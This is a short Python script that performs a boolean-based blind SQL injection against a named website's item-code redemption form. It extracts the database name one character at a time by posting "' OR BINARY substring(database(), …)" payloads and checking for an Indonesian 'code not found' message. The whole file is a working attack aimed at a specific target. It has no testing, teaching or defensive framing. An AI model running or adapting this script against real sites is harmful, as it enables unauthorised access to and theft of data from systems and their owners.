import requests
import sys

url = 'https://pbprojectblackshot.tk/index.php?page=itemcode'

for i in range(1, 10):
	for c in range(0x20, 0x7f):
		post = "1' OR BINARY substring(database(), %d, 1) = '%s' -- " % (i, chr(c))
		form = {'action': 'redeemcode', 'code': post, 'button': 'konfirmasi'}

		response = requests.post(url, data=form)

		if "Tidak ada KODE ini di sistem!" in response.text:
			status = False
		else:
			status = True

		if status == True:
			sys.stdout.write(chr(c))
			break
